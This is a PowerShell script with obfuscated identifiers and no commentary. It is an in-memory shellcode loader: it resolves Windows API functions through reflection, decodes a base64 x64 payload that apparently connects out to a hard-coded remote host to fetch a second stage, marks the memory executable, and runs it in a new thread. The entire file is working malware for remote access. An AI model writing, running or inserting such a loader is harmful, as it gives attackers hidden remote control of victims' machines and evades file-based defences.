function aUk6 {
        Param ($z21E, $le7)
        $ryF = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $ryF.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($ryF.GetMethod('GetModuleHandle')).Invoke($null, @($z21E)))), $le7))
}

function qO3Fo {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $vK,
                [Parameter(Position = 1)] [Type] $x5gt = [Void]
        )

        $peZ = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $peZ.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $vK).SetImplementationFlags('Runtime, Managed')
        $peZ.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $x5gt, $vK).SetImplementationFlags('Runtime, Managed')

        return $peZ.CreateType()
}

[Byte[]]$rY9eF = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSSDHSUWVIi1JgVkiLUhhIi1IgTTHJSItyUEgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lNMclBizSISAHWSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAB4clJEDcUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
[Uint32]$aGS = 0
$pJav = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((aUk6 kernel32.dll VirtualAlloc), (qO3Fo @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $rY9eF.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($rY9eF, 0, $pJav, $rY9eF.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((aUk6 kernel32.dll VirtualProtect), (qO3Fo @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($pJav, [Uint32]$rY9eF.Length, 0x10, [Ref]$aGS)) -eq $true) {
        $q7eWl = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((aUk6 kernel32.dll CreateThread), (qO3Fo @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$pJav,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((aUk6 kernel32.dll WaitForSingleObject), (qO3Fo @([IntPtr], [Int32]))).Invoke($q7eWl,0xffffffff) | Out-Null
}
